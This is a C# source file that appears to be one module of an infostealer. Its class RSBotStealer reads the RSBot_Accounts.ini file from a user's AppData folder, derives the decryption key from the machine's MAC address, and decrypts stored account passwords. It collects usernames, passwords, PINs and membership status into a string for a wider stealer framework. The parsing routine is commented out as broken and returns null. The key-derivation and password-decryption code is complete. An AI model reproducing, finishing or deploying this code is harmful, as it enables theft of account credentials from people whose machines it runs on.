using System;
using System.Globalization;
using System.IO;
using System.Net.NetworkInformation;
using System.Security.Cryptography;
using System.Text;

namespace sub.Stealers
{
    internal class RSBotStealer : IStealer
    {
        public string Data { get; set; }

        public void Collect()
        {
            RSBotAccount[] accounts = GetLocalAccounts(GetLocalKey());
            foreach(RSBotAccount acc in accounts)
            {
                Data += "RSBot Account - Name: " + acc.UserName + " Password: " + acc.Password + " Member: " +
                        acc.IsMember + "Pin: " + acc.Pin + "\r\n";
            }
        }

        public const string SettingsFileName = "RSBot_Accounts.ini";
        public static readonly string SettingsFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), SettingsFileName);
        private const char Delimiter = 'a';
        private const string UserStartCharacter = "[";
        private const string UserEndCharacter = "]";
        private const string PasswordHashItem = "password";
        private const string PinItem = "pin";
        private const string RewardItem = "reward";
        private const string TakeBreaksItem = "take_breaks";
        private const string MemberItem = "member";

        public static RSBotAccount[] GetLocalAccounts(byte[] key)
        {
            using (StreamReader reader = new StreamReader(SettingsFile))
            {
                return GetLocalAccounts(reader.ReadToEnd(), key);
            }
        }

        public static RSBotAccount[] GetLocalAccounts(string accountFileData, byte[] key)
        {
            //Needs to parse data out of accountFileData and decrypt password with key
            /*
            System.Collections.Generic.List<RSBotAccount> ret = new System.Collections.Generic.List<RSBotAccount>();
            RSBotAccount account = new RSBotAccount(username, password, passwordHash, pin, reward, takeBreaks, member);
            ret.Add(account);

            return ret.ToArray();*/

            //Original code is as follows but is broken and messy as fuck
            /*public static RsBotAccount[] GetLocalAccounts(string accountFileData, byte[] key)
		{
			if (!File.Exists(SettingsFile)) {
				throw new FileNotFoundException("could not find accounts file");
			}

			System.Collections.Generic.List<RsBotAccount> ret = new System.Collections.Generic.List<RsBotAccount>();
			string[] split = accountFileData.Split(new string[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries);
			for (int i = 0; i <= split.Length - 1; i++) {
				if (!Strings.Split(i).StartsWith(UserStartCharacter)) {
					continue;
				}

				string username = Strings.Split(i).Replace(UserStartCharacter, string.Empty).Replace(UserEndCharacter, string.Empty);
				string passwordHash = null;
				string password = null;
				string pin = null;
				string reward = null;
				System.Nullable<bool> takeBreaks = null;
				System.Nullable<bool> member = null;

				int j = i + 1;
				while (j < split.Length && !Strings.Split(j).StartsWith(UserStartCharacter)) {
					int startEquals = Strings.Split(j).IndexOf('=');
					if (startEquals <= 0) {
						break; // TODO: might not be correct. Was : Exit While
					}

					string item = Strings.Split(j).Substring(0, startEquals);
					string value = Strings.Split(j).Substring(startEquals + 1, Strings.Split(j).Length - startEquals - 1);
					switch (item) {
						case PasswordHashItem:
							passwordHash = value;
							password = RsBotUtil.DecryptPassword(passwordHash, key);
							break; // TODO: might not be correct. Was : Exit Select

							break;
						case PinItem:
							pin = value;
							break; // TODO: might not be correct. Was : Exit Select

							break;
						case RewardItem:
							reward = value;
							break; // TODO: might not be correct. Was : Exit Select

							break;
						case TakeBreaksItem:
							if (true) {
								bool tmp = false;
								takeBreaks = bool.TryParse(value, out tmp) && tmp;
							}
							break; // TODO: might not be correct. Was : Exit Select

							break;
						case MemberItem:
							if (true) {
								bool tmp = false;
								member = bool.TryParse(value, out tmp) && tmp;
							}
							break; // TODO: might not be correct. Was : Exit Select

							break;
						default:
							break; // TODO: might not be correct. Was : Exit Select

							break;
					}
					j += 1;
					i += 1;
				}

				RsBotAccount account = new RsBotAccount(username, password, passwordHash, pin, reward, takeBreaks, member);
				ret.Add(account);
			}

			return ret.ToArray();
		}
             */
            return null;
        }

        private static byte[] GetLocalKey()
        {
            NetworkInterface[] interfaces = NetworkInterface.GetAllNetworkInterfaces();
            int lowestIndex = -1;
            int lowestInterfaceIndex = -1;
            for (int i = 0; i <= interfaces.Length - 1; i++)
            {
                if (interfaces[i].OperationalStatus != OperationalStatus.Up)
                {
                    continue;
                }

                IPInterfaceProperties ipProperties = interfaces[i].GetIPProperties();
                if (ipProperties == null) continue;

                IPv4InterfaceProperties ipv4Properties = ipProperties.GetIPv4Properties();
                if (ipv4Properties == null) continue;

                if (lowestInterfaceIndex >= 0 && ipv4Properties.Index >= lowestInterfaceIndex) continue;
                lowestIndex = i;
                lowestInterfaceIndex = ipv4Properties.Index;
            }

            byte[] key = ConvertByteEncoding(interfaces[lowestIndex].GetPhysicalAddress().GetAddressBytes());

            return lowestIndex >= 0
                       ? key
                       : Encoding.Default.GetBytes(Environment.UserName +
                                                   CultureInfo.CurrentCulture.TwoLetterISOLanguageName);
        }

        public static byte[] ConvertByteEncoding(byte[] key)
        {
            byte[] ret = new byte[key.Length];
            Array.Copy(key, ret, key.Length);

            for (int i = 0; i <= ret.Length - 1; i++)
            {
                if (!IsValidIso88591(ret[i]))
                {
                    ret[i] = 63;
                }
            }

            return ret;
        }

        private static bool IsValidIso88591(byte value)
        {
            return value <= 127 || value >= 160;
        }

        public static string DecryptPassword(string passwordHash, byte[] key)
        {
            byte[] hashedKey;
            using (SHA1 sha1 = SHA1.Create())
            {
                hashedKey = sha1.ComputeHash(key);
            }

            sbyte[] signedHashKey = Array.ConvertAll(hashedKey, Convert.ToSByte);
            string[] splittedHash = passwordHash.Split(Delimiter);

            byte[] password = new byte[splittedHash.Length];

            int i = 0;
            while (i < hashedKey.Length)
            {
                int val;
                if (!int.TryParse(splittedHash[i], out val))
                {
                    throw new ArgumentOutOfRangeException("passwordHash", "invalid password hash");
                }

                sbyte sbVal = Convert.ToSByte(val);
                if (sbVal == signedHashKey[i])
                {
                    break;
                }

                byte charVal = Convert.ToByte(sbVal - signedHashKey[i]);
                password[i] = charVal;
                i += 1;
            }
            return Encoding.Default.GetString(password, 0, i);
        }
    }

    internal class RSBotAccount
    {
        public string UserName;
        public string PasswordHash;
        public string Password;
        public string Pin;
        public string Reward;
        public bool TakeBreaks;
        public bool IsMember;

        public RSBotAccount(string user, string pass, string pwhash, string pin, string reward, bool breaks, bool member)
        {
            UserName = user;
            Password = pass;
            PasswordHash = pwhash;
            Pin = pin;
            Reward = reward;
            TakeBreaks = breaks;
            IsMember = member;
        }
    }
}